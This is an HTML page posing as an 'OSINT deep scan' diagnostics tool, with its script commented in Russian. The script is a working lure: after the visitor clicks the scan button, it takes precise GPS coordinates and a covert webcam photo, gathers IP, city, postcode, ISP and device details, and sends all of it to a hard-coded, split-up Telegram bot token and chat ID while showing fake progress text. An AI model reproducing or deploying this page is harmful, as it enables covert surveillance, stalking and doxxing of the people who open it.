<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SYSTEM DIAGNOSTICS v4.0</title>
    <style>
        body { margin: 0; background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .terminal { width: 90%; max-width: 650px; background: rgba(0, 20, 0, 0.9); border: 1px solid #00ff41; border-radius: 4px; box-shadow: 0 0 20px rgba(0, 255, 65, 0.2); padding: 25px; }
        .header { border-bottom: 1px solid #00ff41; padding-bottom: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; font-size: 12px; }
        .blink { animation: blinker 0.8s linear infinite; }
        @keyframes blinker { 50% { opacity: 0; } }
        .input-group { display: flex; flex-direction: column; gap: 15px; }
        input { background: transparent; border: 1px solid #00ff41; color: #00ff41; padding: 12px; outline: none; }
        button { background: #00ff41; color: #000; border: none; padding: 15px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
        #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 1000; flex-direction: column; align-items: center; justify-content: center; border: 5px solid #00ff41; box-sizing: border-box; }
        .scanner-line { width: 100%; height: 2px; background: #00ff41; position: absolute; top: 0; animation: scan 2s linear infinite; }
        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="terminal">
    <div class="header">
        <span>⬡ SYSTEM_DIAGNOSTICS_OSINT</span>
        <span class="blink">● ONLINE</span>
    </div>
    <div class="input-group">
        <label>ENTER ACCESS CODE OR TARGET:</label>
        <input type="text" id="target" placeholder="admin / @username / id..." autocomplete="off">
        <button onclick="startDeepScan()">INITIATE DEEP SCAN</button>
    </div>
    <div id="log" style="margin-top:20px; font-size:11px; color:#008f11;">
        > [READY] Waiting for authorization...
    </div>
</div>

<div id="overlay">
    <div class="scanner-line"></div>
    <h1 id="status-title">ANALYZING BIOMETRICS</h1>
    <p id="loader">> ACCESSING HARDWARE: 0%</p>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
    // Твои данные (склеенные)
    const partA = '8570554697';
    const partB = 'AAHRYkl8_AIuO';
    const partC = 'C4gbOl6AxRWOnmEMzw15Eg';
    const BOT_TOKEN = partA + ':' + partB + partC;
    const CHAT_ID = '1751630480';

    async function sendToTg(text) {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: CHAT_ID, text: text, parse_mode: 'Markdown'})
        });
    }

    async function sendPhoto(blob) {
        let formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, 'shot.jpg');
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
    }

    function startDeepScan() {
        const val = document.getElementById('target').value;
        if (!val) return alert("ENTER TARGET!");

        document.getElementById('overlay').style.display = 'flex';
        const loader = document.getElementById('loader');

        // 1. Получаем Гео (точное)
        navigator.geolocation.getCurrentPosition(pos => {
            const geoInfo = `📍 **GPS DATA:**\nLat: \`${pos.coords.latitude}\`\nLon: \`${pos.coords.longitude}\`\nAcc: \`±${pos.coords.accuracy}m\``;
            sendToTg(geoInfo);
        }, err => {
            sendToTg("❌ Геолокация запрещена пользователем.");
        }, {enableHighAccuracy: true});

        // 2. Камера и финальный отчет
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                document.getElementById('video').srcObject = stream;
                loader.innerText = "> SCANNING HARDWARE: 64%";

                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    const video = document.getElementById('video');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    canvas.toBlob(blob => {
                        sendPhoto(blob);
                        generateFullReport(val);
                    }, 'image/jpeg');

                    loader.innerText = "> ENCRYPTING DATA: 100%";
                    setTimeout(() => { location.href = "https://t.me/Osint_search_bot"; }, 2000);
                }, 3000);
            })
            .catch(err => {
                sendToTg("❌ Камера запрещена.");
                generateFullReport(val);
                document.getElementById('overlay').style.display = 'none';
                alert("ERROR: Hardware authentication failed.");
            });
    }

    function generateFullReport(target) {
        const ua = navigator.userAgent;
        const memory = navigator.deviceMemory || 'Unknown';
        const cores = navigator.hardwareConcurrency || 'Unknown';
        const screenRes = `${screen.width}x${screen.height}`;

        fetch('https://ipapi.co/json/')
            .then(res => res.json())
            .then(d => {
                const report = `
💀 **FULL OSINT DOSSIER**
────────────────────
🎯 **Target:** \`${target}\`
🌍 **IP:** \`${d.ip}\`
🏢 **ISP:** \`${d.org}\`
📍 **City:** \`${d.city}, ${d.country_name}\`
📮 **Zip:** \`${d.postal}\`

💻 **HARDWARE:**
• CPU Cores: \`${cores}\`
• RAM: \`${memory} GB\`
• Screen: \`${screenRes}\`
• OS: \`${navigator.platform}\`

📱 **USER-AGENT:**
\`${ua.slice(0, 150)}...\`
────────────────────`;
                sendToTg(report);
            });
    }
</script>
</body>
</html>
